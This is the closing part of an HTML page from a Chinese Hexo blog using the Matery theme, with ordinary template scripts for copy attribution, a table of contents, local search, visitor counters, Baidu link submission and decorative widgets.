        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: StarrySky<br />'
            + '文章作者: StarrySky<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">StarrySky</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">59.5k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">














</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    
    <script type="text/javascript" color="0,0,255"
        pointColor="0,0,255" opacity='0.7'
        zIndex="-1" count="99"
        src="/libs/background/canvas-nest.js"></script>
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":260,"height":300},"mobile":{"show":true},"log":false});</script></body>

</html>
